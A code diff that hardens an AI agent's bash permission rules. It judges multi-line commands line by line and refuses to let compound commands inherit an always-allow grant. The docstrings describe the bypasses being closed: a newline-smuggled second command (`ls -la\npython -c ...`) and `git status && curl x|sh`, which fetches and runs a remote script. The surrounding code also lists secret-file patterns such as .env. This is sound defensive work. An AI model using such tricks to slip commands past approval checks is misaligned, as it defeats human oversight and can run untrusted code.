@@ -510,17 +510,27 @@ def clear_bash_rules_cache() -> None:
 
 
 def bash_rule_decision(command: str | None, *, cwd: str | None = None) -> str | None:
-	"""前缀规则判定：命中多条取最严（allow<ask<deny）；未命中/空命令返回 None。"""
-	toks = _tokenize(command)
-	if not toks:
+	"""前缀规则判定：命中多条取最严（allow<ask<deny）；未命中/空命令返回 None。
+
+	多行命令按物理行逐条判定并取最严结果——防止「首行蹭 allow、
+	次行跑任意脚本」的换行绕过（`ls -la\\npython -c ...` 之类）。
+	"""
+	if not isinstance(command, str):
+		return None
+	lines = [ln for ln in re.split(r"[\r\n]+", command) if ln.strip()]
+	if not lines:
 		return None
 	ruleset = load_bash_rules(_effective_cwd(cwd))
 	best: str | None = None
-	for rule in ruleset.rules_for(_program_of_token(toks[0])):
-		if not _rule_matches_tokens(rule, toks):
+	for ln in lines:
+		toks = _tokenize(ln)
+		if not toks:
 			continue
-		if best is None or _SEVERITY[rule.decision] > _SEVERITY[best]:
-			best = rule.decision
+		for rule in ruleset.rules_for(_program_of_token(toks[0])):
+			if not _rule_matches_tokens(rule, toks):
+				continue
+			if best is None or _SEVERITY[rule.decision] > _SEVERITY[best]:
+				best = rule.decision
 	return best
 
 
@@ -529,7 +539,7 @@ def bash_rule_ask_deny(command: str | None, *, cwd: str | None = None) -> str | 
 	decision = bash_rule_decision(command, cwd=cwd)
 	return decision if decision in ("ask", "deny") else None
 
-_COMPOSITE_RX = re.compile(r"[|;&`]|\$\(|&&|\|\|")
+_COMPOSITE_RX = re.compile(r"[|;&`\n\r]|\$\(|&&|\|\|")
 _SECRET_TOKEN_RX = re.compile(
 	r"(?:^|[\\/\s\"'=])("
 	r"\.env(?:\.[A-Za-z0-9_-]+)?|"
@@ -597,6 +607,25 @@ def bash_secret_read_reason(command: str | None) -> str | None:
 		return "bash_secret_read"
 	_ = _SECRET_READ_CMD_RX  # 保留：后续可收紧为「仅读命令」
 	return None
+
+
+def bash_command_is_composite(command: str | None) -> bool:
+	"""命令是否含组合/多语句/写重定向结构。
+
+	G29: 组合命令(``&&``/``;``/``|``/换行/``$(``/反引号等)不得用「前缀 token」
+	的 always-allow grant 静默放行——``git status && curl x|sh`` 不能蹭
+	``git status`` 的授权;此类命令每次仍需确认。
+	"""
+	if not isinstance(command, str):
+		return True
+	text = _normalize_command(command)
+	if not text:
+		return True
+	if _COMPOSITE_RX.search(text):
+		return True
+	if re.search(r"(?:>>?|2>>?|&>>)", text):
+		return True
+	return False
 
 
 def bash_readonly_allow(command: str | None, *, cwd: str | None = None) -> bool:
